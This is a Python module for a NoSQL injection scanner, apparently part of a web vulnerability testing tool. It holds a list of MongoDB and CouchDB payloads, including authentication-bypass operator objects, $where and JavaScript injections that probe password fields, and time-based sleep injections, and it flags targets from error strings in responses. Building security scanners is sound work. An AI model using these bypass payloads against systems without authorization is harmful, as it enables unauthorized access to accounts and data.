"""
NoSQL Injection Scanner
Tests for NoSQL injection vulnerabilities (MongoDB, etc.)
"""
from typing import List
import logging
from .base import BaseScanner, Vulnerability
from ..core.target import Target

logger = logging.getLogger(__name__)

class NoSQLInjectionScanner(BaseScanner):
    """Scanner for detecting NoSQL injection vulnerabilities"""
    
    def __init__(self, session):
        super().__init__(session)
        self.name = "NoSQL Injection Scanner"
    
    def scan(self, target: Target, callback=None) -> List[Vulnerability]:
        """Scan target for NoSQL Injection vulnerabilities"""
        vulnerabilities = []
        logger.info(f"Starting NoSQL scan on {target.url}")
        
        # NoSQL injection payloads
        payloads = [
            # MongoDB operator injections - Object-based
            {'$ne': None},
            {'$ne': ''},
            {'$ne': 'null'},
            {'$ne': '1'},
            {'$ne': 0},
            {'$gt': ''},
            {'$gt': -1},
            {'$gte': 0},
            {'$lt': 999999},
            {'$regex': '.*'},
            {'$regex': '^.*'},
            {'$exists': True},
            {'$type': 2},
            {'$where': '1==1'},
            
            # MongoDB - Nested objects
            {'username': {'$ne': None}},
            {'username': {'$ne': ''}, 'password': {'$ne': ''}},
            {'username': {'$gt': ''}, 'password': {'$gt': ''}},
            {'username': {'$regex': '.*'}},
            
            # String-based NoSQL injection
            "' || 1==1//",
            "' || 1==1%00",
            "' || '1'=='1",
            "' && '1'=='1",
            "\"; return true; //",
            "\"; return 1==1; //",
            
            # JSON syntax injection
            "{$gt: ''}",
            "{$ne: null}",
            "{$regex: '.*'}",
            "[$ne]=1",
            "[$gt]=",
            "[$regex]=.*",
            "[$where]=1==1",
            
            # Array syntax injection  
            "[\"$ne\"]=\"\"",
            "[\"$gt\"]=\"\"",
            "[\"$regex\"]=\".*\"",
            
            # JavaScript injection in MongoDB
            "'; return true; var dummy='",
            "'; return 1==1; var dummy='",
            "\"; return this.username != ''; //",
            "'; return /.*/.test(this.username); var x='",
            
            # $where operator abuse
            "' || this.password.match(/.*/)//",
            "' || /.*/.test(this.password)//",
            
            # Boolean-based NoSQL
            "admin' && this.password.match(/.*/)//",
            "admin' || '1'=='1",
            
            # Time-based NoSQL (MongoDB)
            "'; sleep(5000); //",
            "\"; var start=new Date(); while((new Date())-start<5000); //",
            
            # Authentication bypass
            "{'$ne': null}",
            "{'$ne': ''}",
            "{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}",
            "{\"$or\": [{\"username\": \"admin\"}, {\"password\": {\"$regex\": \".*\"}}]}",
            
            # CouchDB specific
            "{\"selector\": {\"_id\": {\"$gt\": null}}}",
        ]
        
        error_indicators = [
            'MongoError',
            'mongoose',
            'mongodb',
            'Query failed',
            'unknown operator',
            'Bad query',
            'NoSQL',
            'CouchDB',
            '$where',
            'invalid query',
            'mongo',
            'Cannot use',
            'database error',
            'query selector',
        ]
        
        for payload in payloads:
            try:
                # Test in different positions
                response_get = self.session.get(
                    target.url,
                    params={'id': str(payload)},
                    timeout=5
                )
                
                if response_get.status_code == 200:
                    for indicator in error_indicators:
                        if indicator.lower() in response_get.text.lower():
                            vulnerabilities.append(Vulnerability(
                                name="NoSQL Injection",
                                severity="HIGH",
                                description="Application vulnerable to NoSQL injection",
                                evidence=f"Payload '{payload}' triggered NoSQL error: {indicator}",
                                url=target.url
                            ))
                            return vulnerabilities  # Found one, exit early
                            
            except Exception as e:
                logger.debug(f"Error testing NoSQL injection: {e}")
        
        return vulnerabilities
